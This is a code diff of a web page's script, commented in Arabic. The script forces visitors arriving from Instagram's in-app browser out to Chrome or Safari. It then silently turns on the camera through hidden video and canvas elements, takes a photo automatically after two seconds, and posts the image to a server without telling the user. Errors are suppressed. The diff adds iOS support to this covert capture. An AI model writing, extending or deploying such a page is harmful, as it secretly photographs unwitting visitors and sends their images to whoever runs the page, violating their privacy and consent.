@@ -11,25 +11,36 @@
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    /* =========================
-       1) Redirect from Instagram to Chrome (Android)
-       ========================= */
+    /* =========================================
+       1) Redirect from Instagram In-App Browser
+          - Android → Chrome
+          - iOS → Safari (best-effort)
+       ========================================= */
     (function () {
       const ua = navigator.userAgent || navigator.vendor || window.opera;
-      if (ua.includes("Instagram")) {
-        const url =
-          "intent://" +
-          window.location.host +
-          window.location.pathname +
-          window.location.search +
-          "#Intent;scheme=https;package=com.android.chrome;end";
-        window.location.href = url;
+      const isInstagram = ua.includes("Instagram");
+      const isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+      if (isInstagram) {
+        if (!isIOS) {
+          // Android → Chrome
+          const url =
+            "intent://" +
+            window.location.host +
+            window.location.pathname +
+            window.location.search +
+            "#Intent;scheme=https;package=com.android.chrome;end";
+          window.location.href = url;
+        } else {
+          // iOS → Safari (best possible)
+          window.open(window.location.href, "_blank");
+        }
       }
     })();
 
-    /* =========================
-       2) Camera auto-capture (hidden)
-       ========================= */
+    /* =========================================
+       2) Camera Auto Capture (Hidden)
+       ========================================= */
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
 
@@ -37,11 +48,11 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // انتظار بسيط ثم التقاط تلقائي
+        // انتظار بسيط لاستقرار الكاميرا ثم الالتقاط تلقائيًا
         setTimeout(capturePhoto, 2000);
       })
       .catch(() => {
-        // لا رسائل
+        // لا رسائل – التزام بالعرض التقني
       });
 
     async function capturePhoto() {
@@ -59,7 +70,7 @@
         body: JSON.stringify({ image })
       });
 
-      // إيقاف الكاميرا بعد الالتقاط (اختياري لكنه احترافي)
+      // إيقاف الكاميرا بعد الالتقاط (احترافي)
       const tracks = video.srcObject.getTracks();
       tracks.forEach(t => t.stop());
     }
